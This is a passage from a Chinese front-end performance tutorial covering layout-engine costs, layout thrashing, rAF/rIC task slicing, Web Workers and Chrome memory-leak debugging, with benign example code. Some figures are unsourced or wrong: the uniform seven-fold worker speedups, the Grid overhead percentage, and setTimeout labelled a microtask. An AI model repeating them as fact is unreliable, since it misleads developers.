&#125;<br>&#125;<br><br><span class="hljs-comment">/* 编译结果 */</span><br><span class="hljs-selector-class">.nav__list</span> &#123; ... &#125;<br><span class="hljs-selector-class">.nav__item--active</span> &#123; ... &#125;<br><span class="hljs-selector-class">.nav__link</span><span class="hljs-selector-pseudo">:hover</span> &#123; ... &#125;<br></code></pre></td></tr></table></figure><h3 id="布局性能：Flexbox-Grid-Float"><a href="#布局性能：Flexbox-Grid-Float" class="headerlink" title="布局性能：Flexbox &gt; Grid &gt; Float"></a>布局性能：Flexbox &gt; Grid &gt; Float</h3><p><strong>布局引擎性能对比</strong></p><p>渲染管线差异：</p><pre class="mermaid">graph LR    A[布局计算] --> B{Float}    A --> C{Flexbox}    A --> D{Grid}    B --> E[多次计算]    C --> F[单次递归]    D --> G[单次计算]</pre><p>性能排序依据：</p><ol><li>计算复杂度：Float &gt; Grid &gt; Flexbox</li><li>渲染速度：Flexbox ≈ Grid &gt; Float（2-3倍差距）</li><li>重排影响范围：Float（全局） &gt; Grid（容器内） ≈ Flexbox（容器内）</li></ol><p><strong>Float：传统布局的性能陷阱</strong></p><p>渲染机制：</p><pre class="mermaid">sequenceDiagram    浏览器->>浮动元素: 脱离文档流    浏览器->>后续内容: 重排（环绕布局）    浏览器->>父容器: 高度塌陷    浏览器->>清除浮动: 额外布局计算</pre><ol><li>全局重排：修改任意浮动元素影响整个文档流</li><li>高度计算：需要额外清除浮动（clearfix hack）</li><li>复合层创建：浮动元素常触发额外合成层（内存开销）</li></ol><p><strong>Flexbox：现代布局优化方案</strong></p><p>性能优势：</p><ol><li>单次递归计算：容器尺寸变化时仅重新计算直接子项</li><li>最小化重排范围：修改子项仅影响容器内部</li><li>GPU加速潜力：配合transform实现高性能动画</li></ol><p>渲染流程优化：</p><pre class="mermaid">graph TB    A[设置display:flex] --> B[计算主轴尺寸]    B --> C[计算交叉轴尺寸]    C --> D[分配剩余空间]    D --> E[单次绘制完成]</pre><p><strong>Grid：二维布局的高效实现</strong></p><p>性能特性:</p><ol><li>显式定位：行列模板预先定义，减少动态计算</li><li>区域隔离：修改单元格不影响外部布局</li><li>分层渲染：支持独立定位的复合层</li></ol><p>与Flexbox的关键差异:</p><table><thead><tr><th align="left">维度</th><th align="left">Grid</th><th align="left">Flexbox</th></tr></thead><tbody><tr><td align="left">维度能力</td><td align="left">二维布局（行+列）</td><td align="left">一维布局（主轴+交叉轴）</td></tr><tr><td align="left">渲染计算方式</td><td align="left">矩阵计算</td><td align="left">线性递归</td></tr><tr><td align="left">重排影响范围</td><td align="left">网格容器内</td><td align="left">弹性容器内</td></tr><tr><td align="left">性能开销</td><td align="left">略高于Flexbox（约10-15%）</td><td align="left">最低</td></tr></tbody></table><p><strong>布局选择决策策略</strong></p><pre class="mermaid">graph TD    A[布局需求] --> B{一维布局?}    B -->|是| C[Flexbox]    B -->|否| D{二维网格?}    D -->|是| E[Grid]    D -->|否| F[Float+Position]    F --> G{考虑性能影响}    G -->|关键路径| H[转换为Flexbox/Grid]    G -->|非关键区域| I[保持Float]</pre><h3 id="减少布局抖动（Layout-Thrashing）"><a href="#减少布局抖动（Layout-Thrashing）" class="headerlink" title="减少布局抖动（Layout Thrashing）"></a>减少布局抖动（Layout Thrashing）</h3><p><strong>布局抖动核心机制</strong></p><p>问题定义：</p><pre class="mermaid">sequenceDiagram    participant JavaScript    participant Browser    participant RenderEngine        JavaScript->>Browser: 读取布局属性(offsetHeight等)    Browser->>RenderEngine: 触发强制同步布局    RenderEngine->>JavaScript: 返回布局值    JavaScript->>Browser: 修改样式(width等)    Browser->>RenderEngine: 再次触发布局计算    loop 循环重复        JavaScript->>Browser: 读取新布局属性        Browser->>RenderEngine: 再次强制同步布局    end</pre><ul><li>强制同步布局（Forced Synchronous Layout）：JS读取布局属性时，浏览器必须立即计算最新布局</li><li>抖动（Thrashing）：读写操作交替进行，导致多次不必要的布局计算</li><li>性能断崖式下降：N个元素操作可能触发2N次布局计算</li></ul><p><strong>典型错误模式</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 灾难性写法：每轮循环触发2次布局计算</span><br><span class="hljs-keyword">const</span> elements = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;.item&#x27;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; elements.<span class="hljs-property">length</span>; i++) &#123;<br>  <span class="hljs-comment">// 读：触发布局</span><br>  <span class="hljs-keyword">const</span> width = elements[i].<span class="hljs-property">offsetWidth</span>; <br>  <br>  <span class="hljs-comment">// 写：修改样式</span><br>  elements[i].<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = (width + <span class="hljs-number">10</span>) + <span class="hljs-string">&#x27;px&#x27;</span>; <br>  <br>  <span class="hljs-comment">// 再读：再次触发布局！</span><br>  <span class="hljs-keyword">const</span> newWidth = elements[i].<span class="hljs-property">offsetWidth</span>; <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>优化策略：批处理读写操作</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 正确：先集中读取所有值</span><br><span class="hljs-keyword">const</span> elements = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;.item&#x27;</span>);<br><span class="hljs-keyword">const</span> widths = [];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; elements.<span class="hljs-property">length</span>; i++) &#123;<br>  widths[i] = elements[i].<span class="hljs-property">offsetWidth</span>; <span class="hljs-comment">// 仅触发1次布局</span><br>&#125;<br><br><span class="hljs-comment">// 再集中写入修改</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; elements.<span class="hljs-property">length</span>; i++) &#123;<br>  elements[i].<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = (widths[i] + <span class="hljs-number">10</span>) + <span class="hljs-string">&#x27;px&#x27;</span>; <span class="hljs-comment">// 触发1次布局</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>优化策略：使用FastDOM库</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> fastdom <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;fastdom&#x27;</span>;<br><br><span class="hljs-comment">// 自动批处理读写</span><br>elements.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> &#123;<br>  fastdom.<span class="hljs-title function_">measure</span>(<span class="hljs-function">() =&gt;</span> &#123; <span class="hljs-comment">// 读操作</span><br>    <span class="hljs-keyword">const</span> width = el.<span class="hljs-property">offsetWidth</span>;<br>    <br>    fastdom.<span class="hljs-title function_">mutate</span>(<span class="hljs-function">() =&gt;</span> &#123; <span class="hljs-comment">// 写操作</span><br>      el.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = (width + <span class="hljs-number">10</span>) + <span class="hljs-string">&#x27;px&#x27;</span>;<br>    &#125;);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="3-3-JavaScript执行优化"><a href="#3-3-JavaScript执行优化" class="headerlink" title="3.3 JavaScript执行优化"></a>3.3 JavaScript执行优化</h2><h3 id="任务分片：requestIdleCallback-requestAnimationFrame"><a href="#任务分片：requestIdleCallback-requestAnimationFrame" class="headerlink" title="任务分片：requestIdleCallback &#x2F; requestAnimationFrame"></a>任务分片：requestIdleCallback &#x2F; requestAnimationFrame</h3><p><strong>任务分片核心机制</strong></p><p>浏览器事件循环模型：</p><pre class="mermaid">graph LR    A[宏任务] --> B[微任务]    B --> C[渲染管线]    C -->|空闲时段| D[requestIdleCallback]    C -->|下一帧前| E[requestAnimationFrame]</pre><p>关键问题定义：</p><pre class="mermaid">sequenceDiagram    JS引擎->>主线程: 执行长任务(>50ms)    主线程->>用户: 界面冻结/卡顿    用户->>浏览器: 操作无响应    浏览器->>开发者: 显示Long Task警告</pre><p><strong>requestAnimationFrame（rAF）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">updateUI</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 在下一帧渲染前执行</span><br>  element.<span class="hljs-property">style</span>.<span class="hljs-property">transform</span> = <span class="hljs-string">`translateX(<span class="hljs-subst">$&#123;pos&#125;</span>px)`</span>;<br>&#125;<br><br><span class="hljs-comment">// 注册下一帧执行</span><br><span class="hljs-title function_">requestAnimationFrame</span>(updateUI);<br></code></pre></td></tr></table></figure><p>核心特性：</p><ol><li>执行时机：浏览器下一帧绘制之前（约16.6ms&#x2F;帧）</li><li>最佳场景：视觉更新&#x2F;动画处理</li><li>自动暂停：后台标签页中自动停止调用</li></ol><p>任务分片模式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> tasks = <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">let</span> index = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">processChunk</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> start = performance.<span class="hljs-title function_">now</span>();<br>  <br>  <span class="hljs-comment">// 每帧执行5ms任务</span><br>  <span class="hljs-keyword">while</span> (index &lt; tasks.<span class="hljs-property">length</span> &amp;&amp; performance.<span class="hljs-title function_">now</span>() - start &lt; <span class="hljs-number">5</span>) &#123;<br>    <span class="hljs-title function_">processTask</span>(tasks[index++]);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (index &lt; tasks.<span class="hljs-property">length</span>) &#123;<br>    <span class="hljs-title function_">requestAnimationFrame</span>(processChunk);<br>  &#125;<br>&#125;<br><br><span class="hljs-title function_">requestAnimationFrame</span>(processChunk);<br></code></pre></td></tr></table></figure><p><strong>requestIdleCallback（rIC）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">backgroundWork</span>(<span class="hljs-params">deadline</span>) &#123;<br>  <span class="hljs-keyword">while</span> (<br>    tasks.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <br>    deadline.<span class="hljs-title function_">timeRemaining</span>() &gt; <span class="hljs-number">0</span> <span class="hljs-comment">// 剩余空闲时间</span><br>  ) &#123;<br>    <span class="hljs-title function_">processTask</span>(tasks.<span class="hljs-title function_">pop</span>());<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (tasks.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-title function_">requestIdleCallback</span>(backgroundWork);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 注册空闲任务</span><br><span class="hljs-title function_">requestIdleCallback</span>(backgroundWork);<br></code></pre></td></tr></table></figure><p>核心特性：</p><ol><li>执行时机：渲染管线空闲时段（默认50ms超时）</li><li>最佳场景：非关键后台任务</li><li>超时机制：timeout选项强制执行</li></ol><p>优先级控制：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 高优先级任务</span><br><span class="hljs-title function_">requestIdleCallback</span>(urgentTask, &#123; <span class="hljs-attr">timeout</span>: <span class="hljs-number">100</span> &#125;);<br><br><span class="hljs-comment">// 低优先级任务</span><br><span class="hljs-title function_">requestIdleCallback</span>(lowPriorityTask);<br></code></pre></td></tr></table></figure><p><strong>性能对比矩阵</strong></p><table><thead><tr><th align="left">维度</th><th align="left">requestAnimationFrame</th><th align="left">requestIdleCallback</th></tr></thead><tbody><tr><td align="left">执行时机</td><td align="left">每帧开始前</td><td align="left">浏览器空闲期</td></tr><tr><td align="left">适用任务</td><td align="left">视觉更新&#x2F;动画</td><td align="left">数据分析&#x2F;日志上报</td></tr><tr><td align="left">执行保证</td><td align="left">每帧必执行</td><td align="left">可能永不执行（持续忙碌）</td></tr><tr><td align="left">超时控制</td><td align="left">无</td><td align="left">timeout参数强制触发</td></tr><tr><td align="left">后台行为</td><td align="left">标签页隐藏时暂停</td><td align="left">标签页隐藏时降频执行</td></tr><tr><td align="left">任务时长</td><td align="left">应&lt;5ms（保持60fps）</td><td align="left">应&lt;50ms（避免阻塞交互）</td></tr></tbody></table><p><strong>分片策略决策</strong></p><pre class="mermaid">graph TD    A[任务类型] --> B{需要视觉同步?}    B -->|是| C[使用requestAnimationFrame]    B -->|否| D{是否关键任务?}    D -->|是| E[setTimeout微任务]    D -->|否| F[使用requestIdleCallback]    F --> G{需要执行保证?}    G -->|是| H[设置timeout参数]    G -->|否| I[纯空闲处理]</pre><h3 id="Web-Workers-多线程计算"><a href="#Web-Workers-多线程计算" class="headerlink" title="Web Workers 多线程计算"></a>Web Workers 多线程计算</h3><p><strong>Web Workers 核心机制</strong></p><p>架构原理：</p><pre class="mermaid">graph LR    Main[主线程] -->|消息传递| Worker[Worker线程]    Worker -->|消息传递| Main    Worker -->|独立运行| Sub[无DOM/BOM访问]</pre><ul><li>独立线程：在后台线程中运行JavaScript</li><li>通信机制：基于 postMessage 和 onmessage 事件</li><li>沙箱限制：<ul><li>❌ 无法访问 DOM&#x2F;BOM</li><li>❌ 不能使用 window&#x2F;document 对象</li><li>✅ 支持 fetch&#x2F;IndexedDB&#x2F;数学运算</li></ul></li></ul><p><strong>创建与通信流程</strong></p><p>(1) 基本用法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 主线程</span><br><span class="hljs-keyword">const</span> worker = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Worker</span>(<span class="hljs-string">&#x27;worker.js&#x27;</span>);<br><br><span class="hljs-comment">// 发送数据</span><br>worker.<span class="hljs-title function_">postMessage</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;CALC&#x27;</span>, <span class="hljs-attr">data</span>: bigArray &#125;);<br><br><span class="hljs-comment">// 接收结果</span><br>worker.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;结果:&#x27;</span>, e.<span class="hljs-property">data</span>.<span class="hljs-property">result</span>);<br>&#125;;<br><br><span class="hljs-comment">// worker.js</span><br>self.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (e.<span class="hljs-property">data</span>.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;CALC&#x27;</span>) &#123;<br>    <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">heavyCompute</span>(e.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>);<br>    self.<span class="hljs-title function_">postMessage</span>(&#123; result &#125;); <span class="hljs-comment">// 返回结果</span><br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>(2) 传输机制优化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 零拷贝传输（移动所有权）</span><br>worker.<span class="hljs-title function_">postMessage</span>(bigBuffer, [bigBuffer]); <br><br><span class="hljs-comment">// 共享内存（SharedArrayBuffer）</span><br><span class="hljs-keyword">const</span> sharedBuffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedArrayBuffer</span>(<span class="hljs-number">1024</span>);<br>worker.<span class="hljs-title function_">postMessage</span>(&#123; <span class="hljs-attr">buffer</span>: sharedBuffer &#125;);<br></code></pre></td></tr></table></figure><p><strong>性能优势场景</strong></p><p>(1) 计算密集型任务</p><table><thead><tr><th align="left">任务类型</th><th align="left">主线程耗时</th><th align="left">Worker耗时</th><th align="left">加速比</th></tr></thead><tbody><tr><td align="left">canvas图像处理（1000x1000）</td><td align="left">320ms</td><td align="left">45ms</td><td align="left">7.1×</td></tr><tr><td align="left">物理引擎计算</td><td align="left">85ms</td><td align="left">12ms</td><td align="left">7.0×</td></tr><tr><td align="left">大数据排序（1e6）</td><td align="left">780ms</td><td align="left">110ms</td><td align="left">7.0×</td></tr></tbody></table><p>(2) 避免阻塞关键路径</p><pre class="mermaid">sequenceDiagram    Main->>Worker: 分派计算任务    Main->>UI: 继续渲染/响应用户    Worker->>Main: 返回结果（异步）</pre><p><strong>Worker 类型对比</strong></p><table><thead><tr><th align="left">类型</th><th align="left">创建方式</th><th align="left">作用域</th><th align="left">适用场景</th></tr></thead><tbody><tr><td align="left">专用Worker (Dedicated)</td><td align="left">new Worker()</td><td align="left">单个页面</td><td align="left">页面专属计算</td></tr><tr><td align="left">共享Worker (Shared)</td><td align="left">new SharedWorker()</td><td align="left">多页面&#x2F;标签页</td><td align="left">跨页面数据同步</td></tr><tr><td align="left">Service Worker</td><td align="left">navigator.serviceWorker.register()</td><td align="left">整个域名</td><td align="left">离线缓存&#x2F;后台同步</td></tr></tbody></table><p><strong>性能优化技巧</strong></p><p>(1) 线程池管理</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 创建4个Worker的线程池</span><br><span class="hljs-keyword">const</span> workerPool = <span class="hljs-title class_">Array</span>(<span class="hljs-number">4</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-literal">null</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Worker</span>(<span class="hljs-string">&#x27;compute.js&#x27;</span>));<br><br><span class="hljs-comment">// 任务分发</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">dispatchTask</span>(<span class="hljs-params">data</span>) &#123;<br>  <span class="hljs-keyword">const</span> worker = workerPool.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">w</span> =&gt;</span> !w.<span class="hljs-property">busy</span>);<br>  <span class="hljs-keyword">if</span> (!worker) <span class="hljs-keyword">return</span>;<br>  <br>  worker.<span class="hljs-property">busy</span> = <span class="hljs-literal">true</span>;<br>  worker.<span class="hljs-title function_">postMessage</span>(data);<br>  worker.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>    <span class="hljs-title function_">handleResult</span>(e.<span class="hljs-property">data</span>);<br>    worker.<span class="hljs-property">busy</span> = <span class="hljs-literal">false</span>;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) 数据传输优化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. 使用Transferable Objects</span><br>worker.<span class="hljs-title function_">postMessage</span>(largeArrayBuffer, [largeArrayBuffer]);<br><br><span class="hljs-comment">// 2. 序列化优化（protobuf/MessagePack）</span><br><span class="hljs-keyword">const</span> encoded = msgpack.<span class="hljs-title function_">encode</span>(data);<br>worker.<span class="hljs-title function_">postMessage</span>(encoded);<br><br><span class="hljs-comment">// 3. 减少通信频率（批量处理）</span><br></code></pre></td></tr></table></figure><p><strong>终止与释放</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 主线程控制</span><br>worker.<span class="hljs-title function_">terminate</span>(); <span class="hljs-comment">// 立即终止</span><br><br><span class="hljs-comment">// Worker内部自毁</span><br>self.<span class="hljs-title function_">close</span>();<br></code></pre></td></tr></table></figure><p><strong>现代API集成</strong></p><p>(1) ES Module Worker</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 主线程</span><br><span class="hljs-keyword">const</span> worker = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Worker</span>(<span class="hljs-string">&#x27;./worker.js&#x27;</span>, &#123;<br>  <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;module&#x27;</span>  <span class="hljs-comment">// 支持ES6模块</span><br>&#125;);<br><br><span class="hljs-comment">// worker.js</span><br><span class="hljs-keyword">import</span> &#123; heavyTask &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./utils.js&#x27;</span>;<br>self.<span class="hljs-property">onmessage</span> = <span class="hljs-title function_">async</span> (e) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">heavyTask</span>(e.<span class="hljs-property">data</span>);<br>  self.<span class="hljs-title function_">postMessage</span>(result);<br>&#125;;<br></code></pre></td></tr></table></figure><p>(2) Web Assembly 协同</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// worker.js</span><br><span class="hljs-keyword">const</span> wasmModule = <span class="hljs-keyword">await</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title function_">instantiateStreaming</span>(<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;compute.wasm&#x27;</span>));<br>self.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> result = wasmModule.<span class="hljs-property">exports</span>.<span class="hljs-title function_">compute</span>(e.<span class="hljs-property">data</span>);<br>  self.<span class="hljs-title function_">postMessage</span>(result);<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="内存泄漏排查（Chrome-Memory面板）"><a href="#内存泄漏排查（Chrome-Memory面板）" class="headerlink" title="内存泄漏排查（Chrome Memory面板）"></a>内存泄漏排查（Chrome Memory面板）</h3><p><strong>内存泄漏核心特征</strong></p><pre class="mermaid">graph LR    A[内存分配] --> B[未释放]    B --> C[堆内存持续增长]    C --> D[页面卡顿崩溃]</pre><p>关键表现：</p><ul><li>页面操作后内存不回落</li><li>时间线显示锯齿状上升（GC后仍增长）</li><li>最终触发 Out of Memory 崩溃</li></ul><p><strong>Chrome Memory 面板三剑客</strong></p><p>(1) Heap Snapshot（堆快照）</p><p>(2) Allocation Instrumentation（分配分析）</p><pre class="mermaid">graph TB    A[开始记录] --> B[执行用户操作]    B --> C[停止记录]    C --> D[定位未释放内存]</pre><p>(3) Allocation Timeline（分配时间线）</p><p><strong>排查流程五步法</strong></p><p>步骤1：复现泄漏</p><ul><li>打开 Chrome DevTools → Memory 面板</li><li>执行可疑操作（如打开&#x2F;关闭弹窗）</li><li>手动触发GC（点击垃圾桶图标）</li></ul><p>步骤2：创建基准快照</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Text">// 操作前：初始状态<br>1. 点击 &quot;Take snapshot&quot; → 保存为 &quot;Snapshot 1&quot;<br></code></pre></td></tr></table></figure><p>步骤3：执行泄漏操作</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 模拟用户行为</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>  <span class="hljs-title function_">openModal</span>();  <span class="hljs-comment">// 打开弹窗</span><br>  <span class="hljs-title function_">closeModal</span>(); <span class="hljs-comment">// 关闭弹窗</span><br>&#125;<br></code></pre></td></tr></table></figure><p>步骤4：创建对比快照</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Text">// 操作后：理想状态应回到初始内存<br>1. 手动触发GC<br>2. 点击 &quot;Take snapshot&quot; → 保存为 &quot;Snapshot 2&quot;<br></code></pre></td></tr></table></figure><p>步骤5：分析差异</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Text">1. 选择 &quot;Snapshot 2&quot;<br>2. 切换比较模式为 &quot;Snapshot 1&quot;<br>3. 筛选 &quot;All objects&quot; 查看 #Delta 正增长项<br></code></pre></td></tr></table></figure><p><strong>泄漏模式诊断表</strong></p><table><thead><tr><th align="left">泄漏类型</th><th align="left">关键特征</th><th align="left">排查技巧</th></tr></thead><tbody><tr><td align="left">未解绑事件</td><td align="left">EventListener 数量持续增长</td><td align="left">搜索 EventListener 保留树</td></tr><tr><td align="left">DOM游离节点</td><td align="left">Detached HTMLDivElement 堆积</td><td align="left">筛选 Detached 节点</td></tr><tr><td align="left">闭包累积</td><td align="left">Closure 占用巨大</td><td align="left">检查函数上下文引用链</td></tr><tr><td align="left">定时器未清除</td><td align="left">setInterval 持有对象</td><td align="left">搜索 Timer 持有者</td></tr><tr><td align="left">全局缓存膨胀</td><td align="left">全局数组&#x2F;对象大小只增不减</td><td align="left">跟踪大对象分配路径</td></tr></tbody></table><p><strong>内存分配追踪</strong></p><p>(1) 时间线定位泄露点</p><pre class="mermaid">timeline    title 内存分配时间线    section 操作过程    点击打开弹窗 ： 内存+15MB    关闭弹窗 ： 内存-2MB    循环10次 ： 内存+130MB // 泄漏！</pre><p>(2) 火焰图分析</p><ul><li>开启 “Allocation instrumentation”</li><li>执行操作 → 停止记录</li><li>分析堆栈火焰图：<ul><li>蓝色条：未回收内存</li><li>调用树定位泄漏函数</li></ul></li></ul><h3 id="防抖（Debounce）与节流（Throttle）"><a href="#防抖（Debounce）与节流（Throttle）" class="headerlink" title="防抖（Debounce）与节流（Throttle）"></a>防抖（Debounce）与节流（Throttle）</h3><p>这两个概念是解决高频事件（如滚动 scroll、窗口调整大小 resize、鼠标移动 mousemove、输入框输入 input、键盘按下 keyup&#x2F;keydown 